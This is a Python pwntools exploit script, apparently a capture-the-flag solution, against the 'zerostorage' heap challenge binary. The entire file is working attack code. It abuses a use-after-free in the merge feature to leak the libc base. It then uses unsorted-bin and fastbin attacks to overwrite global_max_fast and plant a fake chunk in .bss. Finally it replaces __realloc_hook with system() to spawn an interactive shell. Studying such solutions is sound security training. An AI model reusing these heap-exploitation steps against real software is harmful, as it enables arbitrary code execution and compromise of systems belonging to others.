#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
zero = ELF('./zerostorage')
if args['REMOTE']:
    p = remote('111', 111)
else:
    p = process('./zerostorage')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def insert(length, data):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Length of new entry: ')
    p.sendline(str(length))
    p.recvuntil('Enter your data:')
    p.send(data)


def update(entryid, length, data):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Entry ID: ')
    p.sendline(str(entryid))
    p.recvuntil('Length of entry: ')
    p.sendline(str(length))
    p.recvuntil('Enter your data: ')
    p.sendline(data)


def merge(fro, to):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Merge from Entry ID: ')
    p.sendline(str(fro))
    p.recvuntil('Merge to Entry ID: ')
    p.sendline(str(to))


def delete(entryid):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.sendline(str(entryid))


def view(entryid):
    p.recvuntil('Your choice: ')
    p.sendline('5')
    p.recvuntil('Entry ID: ')
    p.sendline(str(entryid))


def list():
    p.recvuntil('Your choice: ')
    p.sendline('6')


def hack():
    # leak  
    gdb.attach(p)
    insert(0x10,'a' * 0x10) # id=0
    insert(0x10,'b' * 0x10) # id=1
    insert(len('/bin/bash'),'/bin/bash') # id=2
    insert(0x91,0x91 * 'z') # id=3,set fake_chunk->size = 0x91
    merge(0,0) # id=4,UAF
    view(4)
    p.readline()
    unsorted_bin = u64(p.recv(8,timeout = 0.1))
    main_arena_offset = 0x3c4b20
    global_max_fast_offset = 0x3c67f8
    libc_base = unsorted_bin - main_arena_offset - 0x58
    log.success('leak libc base address:' + hex(libc_base))
    # unsorted bin attack,change global_max_fast 
    global_max_fast = libc_base + global_max_fast_offset 
    log.info('global_max_fast address:' + hex(global_max_fast))
    payload = p64(0) + p64(global_max_fast - 0x10) 
    payload = payload.ljust(0x80,'f')
    update(4,len(payload),payload) # UAF: write unsorted_chunk->bck
    raw_input()
    insert(0x10, 'c' * 0x10) # (0,1,2,3) id=0,trigger unsorted bin attack
    # fastbin attack
    merge(1,1) # id=5,chunk id(1) link to fastbin[9] 
    addr = 0x5555557570a8 # bss:struct array header
    payload = p64(addr)
    update(5,len(payload),payload) # UAF: write fast_chunk->fd=addr
    #raw_input()
    insert(0x10,'g' * 0x10) # (0,1,2,3,4) id=1
    insert(0x80,'h' * 0x80) # id=6,get fake chunk at bss,able any-write 
    view(6) # leak enc number
    enc_addr = u64(p.recv(0x5c)[-8:])
    enc = (addr + 0x10) ^ enc_addr
    log.success('leak the enc num:' + hex(enc))
    # overwrite realloc_hook 
    realloc_hook = libc_base + 0x3c4b08
    system = libc_base + 0x45390
    execve = libc_base + 0xcc770
    log.info('realloc_hook addr :' + hex(realloc_hook))
    log.info('system addr :' + hex(system))
    payload = p64(realloc_hook ^ enc) 
    payload = payload.ljust(0x80,'k')
    update(6,len(payload),payload)
    #raw_input()
    payload = p64(system)
    #payload = p64(execve)
    payload = payload.ljust(0x91,'i') # same size to avoid realloc
    update(3,len(payload),payload) # write system() to realloc_hook 
    #raw_input()
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Entry ID: ')
    p.sendline('2')
    p.recvuntil('Length of entry: ')
    p.sendline(str(0x100))
    #update(2,0x100,'t' * 0x100) # call realloc(),trigger system,get shell 
    print 'test**'
    #raw_input()
    p.interactive()
     

if __name__ == '__main__':
    hack()
